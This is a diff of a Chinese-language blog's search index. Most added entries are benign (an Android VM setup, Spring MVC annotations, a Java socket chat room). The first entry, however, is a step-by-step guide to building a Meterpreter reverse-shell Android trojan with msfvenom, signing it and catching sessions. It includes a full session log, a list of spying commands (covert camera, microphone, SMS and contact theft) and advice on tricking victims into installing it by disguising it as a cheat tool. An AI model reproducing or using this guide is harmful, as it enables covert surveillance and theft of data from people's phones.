@@ -4,6 +4,87 @@
   
     
     <entry>
+      <title>kali生成安卓木马</title>
+      <link href="/2019/12/29/attark/as/"/>
+      <url>/2019/12/29/attark/as/</url>
+      
+        <content type="html"><![CDATA[<h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>需要有kali系统并且保证相关命令正常执行。<br>登录Oracle官网下载Linux版的jdk<br>事出有因，期末了各科都要交项目，安卓也不例外，我想着交什么呢？交安卓app感觉太过乏味，还是这个比较新颖，显得Big高。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>1.打开终端，输入ifconfig查看ip地址(也是监听地址)<br>2.输入以下命令</p><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=5555 R &gt; /root/apk.apk</code></pre><p>3.为了木马的兼容性为其配置签名，并验证  </p><pre><code>创建证书:keytool -genkey -V -keystore apk-trojan-key.keystore -alias apk -keyalg RSA -keysize 1024 -validity 999  注意:这里alias参数后跟apk文件夹的文件名，文件名参考第二部生成，可自行设置。  签名:jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore apk.apk apk 验证:jarsigner -verify -verbose apk.apk</code></pre><p>4.使用Zipalign优化apk</p><pre><code>安装命令:apt-get install zipalign优化apk:zipalign -v 4 apk.apk aaaa.apk</code></pre><p>5.启动攻击加载模块，设置反弹连接</p><pre><code>启动msf:msfconsole1.use exploit/multi/handler //加载模块2. set payload android/meterpreter/reverse_tcp //选择Payload3.show options //查看参数设置这个payload里边有两个参数要设置 LHOST和LPORT 表示地址和端口 默认的端口是4444 现在我们来更改设置1.set LHOST 172.23.0.209 //这里的地址设置成我们刚才生成木马的IP地址2.set LPORT 5555 //这里的端口设置成刚才我们生成木马所监听的端口3.exploit //开始执行漏洞 开始监听,等待手机上线</code></pre><h4 id="结果流程演示"><a href="#结果流程演示" class="headerlink" title="结果流程演示"></a>结果流程演示</h4><pre><code>root@kali:~# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.210.26.27  netmask 255.255.248.0  broadcast 10.210.31.255        inet6 fe80::20c:29ff:fe4f:7237  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:4f:72:37  txqueuelen 1000  (Ethernet)        RX packets 16  bytes 2062 (2.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 37  bytes 3277 (3.2 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 20  bytes 1116 (1.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 20  bytes 1116 (1.0 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=10.210.26.27 LPORT=5555 R &gt; /root/apk.apk[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload[-] No arch selected, selecting arch: dalvik from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 10085 bytesroot@kali:~# keytool -genkey -V -keystore apk-trojan-key.keystore -alias apk -keyalg RSA -keysize 1024 -validity 999输入密钥库口令:  再次输入新口令: 您的名字与姓氏是什么?  [Unknown]:  1您的组织单位名称是什么?  [Unknown]:  1您的组织名称是什么?  [Unknown]:  1您所在的城市或区域名称是什么?  [Unknown]:  1您所在的省/市/自治区名称是什么?  [Unknown]:  1该单位的双字母国家/地区代码是什么?  [Unknown]:  1CN=1, OU=1, O=1, L=1, ST=1, C=1是否正确?  [否]:  y正在为以下对象生成 1,024 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 999 天):     CN=1, OU=1, O=1, L=1, ST=1, C=1输入 &lt;apk&gt; 的密钥口令    (如果和密钥库口令相同, 按回车):  [正在存储apk-trojan-key.keystore]Warning:JKS 密钥库使用专用格式。建议使用 &quot;keytool -importkeystore -srckeystore apk-trojan-key.keystore -destkeystore apk-trojan-key.keystore -deststoretype pkcs12&quot; 迁移到行业标准格式 PKCS12。root@kali:~# jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore apk.apk apk输入密钥库的密码短语:    正在添加: META-INF/APK.SF   正在添加: META-INF/APK.RSA  正在签名: AndroidManifest.xml  正在签名: resources.arsc  正在签名: classes.dex&gt;&gt;&gt; 签名者    X.509, CN=1, OU=1, O=1, L=1, ST=1, C=1    [可信证书]jar 已签名。警告: 签名者证书为自签名证书。root@kali:~# jarsigner -verify -verbose apk.apks        258 Sat Dec 28 10:47:08 EST 2019 META-INF/MANIFEST.MF         393 Sat Dec 28 10:49:06 EST 2019 META-INF/APK.SF         870 Sat Dec 28 10:49:06 EST 2019 META-INF/APK.RSA         272 Sat Dec 28 10:47:08 EST 2019 META-INF/SIGNFILE.SF        1842 Sat Dec 28 10:47:08 EST 2019 META-INF/SIGNFILE.RSA           0 Sat Dec 28 10:47:08 EST 2019 META-INF/sm      6992 Sat Dec 28 10:47:08 EST 2019 AndroidManifest.xmlsm       572 Sat Dec 28 10:47:08 EST 2019 resources.arscsm     19932 Sat Dec 28 10:47:08 EST 2019 classes.dex  s = 已验证签名   m = 在清单中列出条目  k = 在密钥库中至少找到了一个证书  i = 在身份作用域内至少找到了一个证书- 由 &quot;CN=1, OU=1, O=1, L=1, ST=1, C=1&quot; 签名    摘要算法: SHA1    签名算法: SHA256withRSA, 1024 位密钥- 无法解析的与签名相关的文件 META-INF/SIGNFILE.SFjar 已验证。警告: 此 jar 包含其证书链无效的条目。原因: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target此 jar 包含其签名者证书为自签名证书的条目。此 jar 包含的签名没有时间戳。如果没有时间戳, 则在其中任一签名者证书到期 (最早为 2022-09-22) 之后, 用户可能无法验证此 jar。有关详细信息, 请使用 -verbose 和 -certs 选项重新运行。签名者证书将于 2022-09-22 到期。root@kali:~# zipalign -v 4 apk.apk aaaa.apkVerifying alignment of aaaa.apk (4)...      50 META-INF/MANIFEST.MF (OK - compressed)     283 META-INF/APK.SF (OK - compressed)     626 META-INF/APK.RSA (OK - compressed)    1316 META-INF/ (OK)    1366 META-INF/SIGNFILE.SF (OK - compressed)    1648 META-INF/SIGNFILE.RSA (OK - compressed)    2733 AndroidManifest.xml (OK - compressed)    4500 resources.arsc (OK - compressed)    4730 classes.dex (OK - compressed)Verification successfulroot@kali:~# msfconsole[-] ***rting the Metasploit Framework console...-[-] * WARNING: No database support: could not connect to server: Connection refused    Is the server running on host &quot;localhost&quot; (::1) and accepting    TCP/IP connections on port 5432?could not connect to server: Connection refused    Is the server running on host &quot;localhost&quot; (127.0.0.1) and accepting    TCP/IP connections on port 5432?[-] ***      .:okOOOkdc&#39;           &#39;cdkOOOko:.    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:  &#39;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#39;  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx  lOOOOOOOO.         ;d;         ,OOOOOOOOl  .OOOOOOOO.   .;           ;    ,OOOOOOOO.   cOOOOOOO.   .OOc.     &#39;oOO.   ,OOOOOOOc    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl      ;OOOO&#39;   .OOOO.   :OOOO.   ;OOOO;       .dOOo   .OOOOocccxOOOO.   xOOd.         ,kOl  .OOOOOOOOOOOOO. .dOk,           :kk;.OOOOOOOOOOOOO.cOk:             ;kOOOOOOOOOOOOOOOk:               ,xOOOOOOOOOOOx,                 .lOOOOOOOl.                    ,dOd,                      .       =[ metasploit v5.0.41-dev                          ]    + -- --=[ 1914 exploits - 1074 auxiliary - 330 post       ]    + -- --=[ 556 payloads - 45 encoders - 10 nops            ]    + -- --=[ 4 evasion                                       ]msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcppayload =&gt; android/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (android/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf5 exploit(multi/handler) &gt; set LHOST 10.210.26.27LHOST =&gt; 10.210.26.27msf5 exploit(multi/handler) &gt; set LPORT 5555LPORT =&gt; 5555msf5 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 10.210.26.27:5555 [*] Sending stage (72435 bytes) to 10.210.26.14[*] Meterpreter session 1 opened (10.210.26.27:5555 -&gt; 10.210.26.14:53964) at 2019-12-28 10:55:04 -0500meterpreter &gt; sysinfoComputer    : localhostOS          : Android 8.1.0 - Linux 4.19.50-android-x86_64-geeb7e76e5df5 (x86_64)Meterpreter : dalvik/androidmeterpreter &gt; 到此完成木马生成及植入</code></pre><h3 id="木马常用监听命令"><a href="#木马常用监听命令" class="headerlink" title="木马常用监听命令"></a>木马常用监听命令</h3><pre><code>     webcam_list  列出网络摄像头    webcam_stream //开启摄像头    webcam_snap //隐秘拍照功能    record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒    webcam_chat  开始视频聊天    webcam_snap  从指定的摄像头获取快照    webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]    Android Commands    =================    activity_start  从URI字符串启动Android活动    check_root  检查设备是否有根    dump_calllog  获取调用日志    dump_contacts  获取联系人列表    dump_sms  获取短信    geolocate  利用地理定位获取当前LAT    wlan_geolocate  利用WLAN信息获取当前LAT    hide_app_icon  从发射器隐藏应用程序图标    interval_collect  管理区间收集能力    send_sms  从目标会话发送短消息    set_audio_mode    sqlite_query  从存储库查询SQLite数据库    wakelock  启用/禁用Wakelock    可以输入?查看更多命令</code></pre><h3 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h3><h4 id="jarsigner命令找不到"><a href="#jarsigner命令找不到" class="headerlink" title="jarsigner命令找不到"></a>jarsigner命令找不到</h4><p>原因:没有安装Java jdk，改命令基于Java jdk执行，解决需要给kali配置Java jdk环境。<br><a href="https://www.gworg.com/problems/901.html" target="_blank" rel="noopener">jarsigner签名使用</a><br><a href="https://blog.csdn.net/weixin_41732074/article/details/84679138" target="_blank" rel="noopener">推荐jdk安装文档</a></p><h4 id="Zipalign无法下载"><a href="#Zipalign无法下载" class="headerlink" title="Zipalign无法下载"></a>Zipalign无法下载</h4><p><img src="http://img.ahdy.top/QQ%E5%9B%BE%E7%89%8720191228215934.png" alt><br>可能跟你当前的网络环境有关系，换数据试一下，如果行不通参考以下<br><a href="https://www.fujieace.com/kali-linux/update-source.html" target="_blank" rel="noopener">kali源更新</a><br>参考其中的更新命令，更新源之后再尝试是否能下载成功插件。</p><h4 id="木马生成后监视窗口无响应"><a href="#木马生成后监视窗口无响应" class="headerlink" title="木马生成后监视窗口无响应"></a>木马生成后监视窗口无响应</h4><p>显示Started reverse TCP handler on “IP：端口”<br>但是不管怎么点击手机上的app msf里都没反应呢？</p><p>答:<br>服务器这边没反应是没建立起连接。先ping一下查看电脑能否ping通手机，如果可以那可能是端口问题，telnet一下就知道了，有可能端口被防火墙屏蔽了，有可能是端口被其他服务占用了。当然也不排除手机的问题，比如一些安全软件之类的问题，最好在虚拟机内测试避免木马造成不可逆的破坏。</p><h3 id="让安装的人都中招"><a href="#让安装的人都中招" class="headerlink" title="让安装的人都中招"></a>让安装的人都中招</h3><p>1.内网穿透，让你的监控地址成为一个公网IP这样就能接收到广域网的传来信息。</p><p>2.木马涉及的敏感权限较多，需要加壳，最近在研究apk反编译等技术，希望能修改掉apk图标，名称等。  </p><p>3.如何让别人心甘情愿的自己安装，不仅要看木马的伪装，也要看你如何去社工，其实社工的本质就是研究对方的心理，达到欺骗目的，比如你可以说，这是一个抢红包外挂，是不是对方极大程度的对软件的安全性放松警惕呢？</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>文章内容仅供学习参考,不得用于非法测试,请遵守国家法律!</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Kali </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Kali </tag>
+            
+            <tag> 木马 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>VMware安装安卓虚拟机</title>
+      <link href="/2019/12/28/as/asvmware/"/>
+      <url>/2019/12/28/as/asvmware/</url>
+      
+        <content type="html"><![CDATA[<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p><a href="https://www.osboxes.org/android-x86/#android-x86-8-vmware" target="_blank" rel="noopener">安卓虚拟机镜像直达</a><br>可能会比较卡…<br><a href="https://blog.csdn.net/qq_44402990/article/details/98480842" target="_blank" rel="noopener">参考文档</a></p><h3 id="踩坑问题解决"><a href="#踩坑问题解决" class="headerlink" title="踩坑问题解决"></a>踩坑问题解决</h3><p>如果你幸运的一次性安装好了虚拟机那么就不要看下面这些，如果，如果你是不幸的。<br>在安装好了虚拟机之后<br><img src="http://img.ahdy.top/2019-12-28_223306.png" alt="效果图"><br>你玩了一会儿就会发现，它不让下载应用，关于这种问题的解决可以参考<br><a href="https://blog.csdn.net/weixin_43913500/article/details/88760557" target="_blank" rel="noopener">解决文档</a><br><img src="http://img.ahdy.top/2019-12-28_224449.png" alt="手动敲进命令"><br>使用wget下载安装(可能因为谷歌系统时间问题导致应用数据请求不到，按照提示修改时间差)，之后，就能安装别的应用了。<br><img src="http://img.ahdy.top/2019-12-28_230855.png" alt></p><h4 id="无法上网"><a href="#无法上网" class="headerlink" title="无法上网"></a>无法上网</h4><p>首先检查VMware虚拟机服务是否被禁用，如果你的电脑上有360，那么这一步更加重要。<br>按下Ctrl+Shift+Esc，打开任务管理器，点服务<br><img src="http://img.ahdy.top/2019-12-28_233303.png" alt="全开启"><br>重启模拟器打开WiFi一般情况即可恢复上网</p><pre><code>虚拟机中的安卓是从谷歌上下的，那应该有终端模拟器,不过VM虚拟机要联网的前提是用以太网才行，无线网无法虚拟的进入终端模拟器，首先输入 ip a 回车，看一下出来的选项里面有没有eth0，如果没有的话，那就是缺失驱动如果有eth0那就好办了，输入su 回车使终端模拟器获得root权限然后输入dhcpcd eth0 使以太网自动取得IP最后一步，设定 DNS Server，输入setprop net.dns1 8.8.8.8即可上网</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> VMware </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境 </tag>
+            
+            <tag> VMware </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Spring MVC 接口</title>
+      <link href="/2019/12/28/ssm/spinterface/"/>
+      <url>/2019/12/28/ssm/spinterface/</url>
+      
+        <content type="html"><![CDATA[<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><pre><code>Spring4.3中引进了｛@GetMapping、@PostMapping、@PutMapping、@DeleteMapping、@PatchMapping｝  来帮助简化常用的HTTP方法的映射，并更好地表达被注解方法的语义。 @RequestMapping如果没有指定请求方式，将接收Get,Post,Head,Options等所有的请求方式@GetMapping是一个组合注解，是@RequestMapping(method = RequestMethod.GET)的缩写。@PostMapping是一个组合注解，是@RequestMapping(method = RequestMethod.POST)的缩写。</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该地址类似原来servlet的地址，web前端访问地址时会自动执行注解下的方法。</p><pre><code>@Controllerpublic class HelloWorldController {    //只接受get方式的请求    @GetMapping(&quot;/testGetMapping&quot;)    public String testGetMapping(Model model) {        model.addAttribute(&quot;msg&quot;,&quot;测试@GetMapping注解&quot;);        return &quot;success&quot;;    }    //只接受post方式的请求    @PostMapping(&quot;/testPostMapping&quot;)    public String testPostMapping(Model model) {        model.addAttribute(&quot;msg&quot;,&quot;测试@PostMapping注解&quot;);        return &quot;success&quot;;    }}</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Spring </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Spring </tag>
+            
+            <tag> 注解 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>IDEA报错</title>
       <link href="/2019/12/24/framework/ideaerror01/"/>
       <url>/2019/12/24/framework/ideaerror01/</url>
@@ -166,33 +247,6 @@
     
     
     <entry>
-      <title>简易版聊天室</title>
-      <link href="/2019/12/11/java/socket/"/>
-      <url>/2019/12/11/java/socket/</url>
-      
-        <content type="html"><![CDATA[<h3 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h3><p>已经有半个月没写文档了，到了大二，我深刻体会到了编程语言的博大精深，于是我陷入了思考，到底什么样算是会编程呢？我发现在一些Java书籍中，仅仅只是介绍了常用代码的使用方式，及作用，并没有涉及底层，构造原理，不懂底层也就谈不上修改，优化了，每当在写代码的时候，明明一个API下有那么多方法，我却仅仅只认得那么一两个方法，很多索引出的内容都要通过记忆单词的方式去过滤，学习知识都是照搬照抄，我真的了解编程吗？我想我并不会编程，我所使用的编程都是遵循原有的规则去实现的，那么这样走下去，我想我不会是一个程序员，顶多算一个代码搬运工，深知现状却无能为力，感慨万千：人生好难！</p><h3 id="socket实现简易聊天室"><a href="#socket实现简易聊天室" class="headerlink" title="socket实现简易聊天室"></a>socket实现简易聊天室</h3><h4 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h4><pre><code>package demo;import java.net.*; import java.io.*; import java.util.*; public class Server {   int port;   List&lt;Socket&gt; clients;   ServerSocket server;   public Server() { try {   port = 8083;   clients = new ArrayList&lt;Socket&gt;();   server = new ServerSocket(port);   System.out.println(&quot;服务器已启动&quot;);   int co=1;   while (true) {     Socket socket = server.accept();     clients.add(socket);     Mythread mythread = new Mythread(socket,co);     co++;     mythread.start();   } } catch (Exception ex) {   System.out.println(&quot;vv&quot;); } } public static void main(String[] args) { new Server(); } class Mythread extends Thread { Socket ssocket; private int count; private BufferedReader br; private PrintWriter pw; public String msg; public Mythread(Socket s,int c) {   ssocket = s;   count=c; } public void run() {   try {     br = new BufferedReader(new InputStreamReader(ssocket.getInputStream()));     msg = &quot;欢迎【&quot; +&quot;Client &quot;+count + &quot;】进入聊天室！当前聊天室有【&quot; + clients.size() + &quot;】人&quot;;     sendMsg();     while ((msg = br.readLine()) != null) {       msg = &quot;【&quot; +&quot;Client &quot;+count + &quot;】说：&quot; + msg;       sendMsg();     }   } catch (Exception ex) {   } } public void sendMsg() {   try {     System.out.println(msg);     for (int i = clients.size() - 1; i &gt;= 0; i--) {       pw = new PrintWriter(clients.get(i).getOutputStream(), true);       pw.println(msg);       pw.flush();     }   } catch (Exception ex) {   } } } } </code></pre><h3 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h3><pre><code>package demo;import java.io.*; import java.net.*; import java.util.*; public class Client {  public int port = 8083;  Socket socket = null;  public static void main(String[] args) {   new Client(); //开始执行  }  public Client() {   try {    socket = new Socket(&quot;127.0.0.1&quot;, port);    new Cthread().start();    BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));    String msg1;    while ((msg1 = br.readLine()) != null) { System.out.println(msg1);    }   } catch (Exception e) {      }  }  class Cthread extends Thread {   public void run() {    try { BufferedReader re = new BufferedReader(new InputStreamReader(System.in)); PrintWriter pw = new PrintWriter(socket.getOutputStream(), true); String msg2; while (true) {  msg2 = re.readLine();  pw.println(msg2); } } catch (Exception e) { e.printStackTrace();    }   }  } }</code></pre><p><img src="http://img.ahdy.top/2019-12-11_193934.png" alt><br>最终效果图，当然这样是无法实现多人在线聊天的，可以通过telnet来实现在线聊天，只不过这个聊天室是一个匿名的，基于cmd窗口。</p><h3 id="实现多人在线聊天"><a href="#实现多人在线聊天" class="headerlink" title="实现多人在线聊天"></a>实现多人在线聊天</h3><p>1.打开控制面板</p><p>2.找到功能和程序</p><p><img src="http://img.ahdy.top/2019-12-11_194343.png" alt></p><p>3.选择启用或关闭Windows功能</p><p>4.打开Windows当中的telnet功能</p><p><img src="http://img.ahdy.top/2019-12-11_194524.png" alt></p><p>5.win+R—&gt;cmd–&gt;输入telnet 127.0.0.1 端口号<br><img src="http://img.ahdy.top/2019-12-11_194839.png" alt><br><img src="http://img.ahdy.top/2019-12-11_194951.png" alt><br>如果让别的电脑连接聊天室需要将本机电脑的防火墙关闭（对方电脑与本机必须处于同一局域网下，否则需要将本机电脑的ip地址映射到公网上）</p><h3 id="可能发生的问题"><a href="#可能发生的问题" class="headerlink" title="可能发生的问题"></a>可能发生的问题</h3><p>无法打开到主机的连接 端口23失败？<br>可能是端口错了，因为telnet的默认连接端口是23  </p><p>格式：</p><pre><code>telnet不仅仅能连接23端口，但是telnet默认连接是23端口要连接其他端口，在cmd打命令telnet 192.168.1.1 135，中间没有“：”，是一个空格`这样telnet就连接到了对方的135端口`</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> Java </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> Socket </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>How to use vue.js</title>
       <link href="/2019/12/11/framework/vue/"/>
       <url>/2019/12/11/framework/vue/</url>
@@ -212,6 +266,33 @@
             <tag> 环境 </tag>
             
             <tag> vue </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简易版聊天室</title>
+      <link href="/2019/12/11/java/socket/"/>
+      <url>/2019/12/11/java/socket/</url>
+      
+        <content type="html"><![CDATA[<h3 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h3><p>已经有半个月没写文档了，到了大二，我深刻体会到了编程语言的博大精深，于是我陷入了思考，到底什么样算是会编程呢？我发现在一些Java书籍中，仅仅只是介绍了常用代码的使用方式，及作用，并没有涉及底层，构造原理，不懂底层也就谈不上修改，优化了，每当在写代码的时候，明明一个API下有那么多方法，我却仅仅只认得那么一两个方法，很多索引出的内容都要通过记忆单词的方式去过滤，学习知识都是照搬照抄，我真的了解编程吗？我想我并不会编程，我所使用的编程都是遵循原有的规则去实现的，那么这样走下去，我想我不会是一个程序员，顶多算一个代码搬运工，深知现状却无能为力，感慨万千：人生好难！</p><h3 id="socket实现简易聊天室"><a href="#socket实现简易聊天室" class="headerlink" title="socket实现简易聊天室"></a>socket实现简易聊天室</h3><h4 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h4><pre><code>package demo;import java.net.*; import java.io.*; import java.util.*; public class Server {   int port;   List&lt;Socket&gt; clients;   ServerSocket server;   public Server() { try {   port = 8083;   clients = new ArrayList&lt;Socket&gt;();   server = new ServerSocket(port);   System.out.println(&quot;服务器已启动&quot;);   int co=1;   while (true) {     Socket socket = server.accept();     clients.add(socket);     Mythread mythread = new Mythread(socket,co);     co++;     mythread.start();   } } catch (Exception ex) {   System.out.println(&quot;vv&quot;); } } public static void main(String[] args) { new Server(); } class Mythread extends Thread { Socket ssocket; private int count; private BufferedReader br; private PrintWriter pw; public String msg; public Mythread(Socket s,int c) {   ssocket = s;   count=c; } public void run() {   try {     br = new BufferedReader(new InputStreamReader(ssocket.getInputStream()));     msg = &quot;欢迎【&quot; +&quot;Client &quot;+count + &quot;】进入聊天室！当前聊天室有【&quot; + clients.size() + &quot;】人&quot;;     sendMsg();     while ((msg = br.readLine()) != null) {       msg = &quot;【&quot; +&quot;Client &quot;+count + &quot;】说：&quot; + msg;       sendMsg();     }   } catch (Exception ex) {   } } public void sendMsg() {   try {     System.out.println(msg);     for (int i = clients.size() - 1; i &gt;= 0; i--) {       pw = new PrintWriter(clients.get(i).getOutputStream(), true);       pw.println(msg);       pw.flush();     }   } catch (Exception ex) {   } } } } </code></pre><h3 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h3><pre><code>package demo;import java.io.*; import java.net.*; import java.util.*; public class Client {  public int port = 8083;  Socket socket = null;  public static void main(String[] args) {   new Client(); //开始执行  }  public Client() {   try {    socket = new Socket(&quot;127.0.0.1&quot;, port);    new Cthread().start();    BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));    String msg1;    while ((msg1 = br.readLine()) != null) { System.out.println(msg1);    }   } catch (Exception e) {      }  }  class Cthread extends Thread {   public void run() {    try { BufferedReader re = new BufferedReader(new InputStreamReader(System.in)); PrintWriter pw = new PrintWriter(socket.getOutputStream(), true); String msg2; while (true) {  msg2 = re.readLine();  pw.println(msg2); } } catch (Exception e) { e.printStackTrace();    }   }  } }</code></pre><p><img src="http://img.ahdy.top/2019-12-11_193934.png" alt><br>最终效果图，当然这样是无法实现多人在线聊天的，可以通过telnet来实现在线聊天，只不过这个聊天室是一个匿名的，基于cmd窗口。</p><h3 id="实现多人在线聊天"><a href="#实现多人在线聊天" class="headerlink" title="实现多人在线聊天"></a>实现多人在线聊天</h3><p>1.打开控制面板</p><p>2.找到功能和程序</p><p><img src="http://img.ahdy.top/2019-12-11_194343.png" alt></p><p>3.选择启用或关闭Windows功能</p><p>4.打开Windows当中的telnet功能</p><p><img src="http://img.ahdy.top/2019-12-11_194524.png" alt></p><p>5.win+R—&gt;cmd–&gt;输入telnet 127.0.0.1 端口号<br><img src="http://img.ahdy.top/2019-12-11_194839.png" alt><br><img src="http://img.ahdy.top/2019-12-11_194951.png" alt><br>如果让别的电脑连接聊天室需要将本机电脑的防火墙关闭（对方电脑与本机必须处于同一局域网下，否则需要将本机电脑的ip地址映射到公网上）</p><h3 id="可能发生的问题"><a href="#可能发生的问题" class="headerlink" title="可能发生的问题"></a>可能发生的问题</h3><p>无法打开到主机的连接 端口23失败？<br>可能是端口错了，因为telnet的默认连接端口是23  </p><p>格式：</p><pre><code>telnet不仅仅能连接23端口，但是telnet默认连接是23端口要连接其他端口，在cmd打命令telnet 192.168.1.1 135，中间没有“：”，是一个空格`这样telnet就连接到了对方的135端口`</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+            <tag> Socket </tag>
             
         </tags>
       
@@ -409,33 +490,6 @@
     
     
     <entry>
-      <title>布局样式失效</title>
-      <link href="/2019/11/23/ssm/missimgcss/"/>
-      <url>/2019/11/23/ssm/missimgcss/</url>
-      
-        <content type="html"><![CDATA[<h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p>当使用重定向转发时发现跳转后的界面失去了布局样式，这种情况一般是路径问题。<br>当在jsp中引入css时，如果其相对路径相对于当前jsp文件的，而在一个和这个jsp的路径不一样的servlet中forward这个jsp时，就会发现这个css样式根本没有起作用。</p><p>这是因为在servlet中转发时css的路径就是相对于这个servlet的相对路径而非jsp的路径了。</p><p>所以这时候不能在jsp中用这样的路径：</p><p><link href="one.css" rel="stylesheet" type="text/css"><br>或者</p><p><link href="../../one.css" rel="stylesheet" type="text/css"></p><h4 id="在css-js的路径前加-pageContext-request-contextPath-，就可以了"><a href="#在css-js的路径前加-pageContext-request-contextPath-，就可以了" class="headerlink" title="在css/js的路径前加${pageContext.request.contextPath}，就可以了"></a>在css/js的路径前加${pageContext.request.contextPath}，就可以了</h4><p>${pageContext.request.contextPath}是JSP取得绝对路径的方法，等价于&lt;%=request.getContextPath()%&gt; 。<br>也就是取出部署的应用程序名或者是当前的项目名称</p><p>比如我的项目名称是demo1在浏览器中输入为<a href="http://localhost:8080/demo1/a.jsp" target="_blank" rel="noopener">http://localhost:8080/demo1/a.jsp</a> ${pageContext.request.contextPath}或&lt;%=request.getContextPath()%&gt;取出来的就是/demo1,而”/“代表的含义就是<a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a></p><p>故有时候项目中这样写${pageContext.request.contextPath}/a.jsp</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 样式 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CSS </tag>
-            
-            <tag> JS </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>iframe标签</title>
       <link href="/2019/11/23/ssm/ifream/"/>
       <url>/2019/11/23/ssm/ifream/</url>
@@ -452,7 +506,34 @@
       
         <tags>
             
+            <tag> CSS </tag>
+            
             <tag> 子页面 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>布局样式失效</title>
+      <link href="/2019/11/23/ssm/missimgcss/"/>
+      <url>/2019/11/23/ssm/missimgcss/</url>
+      
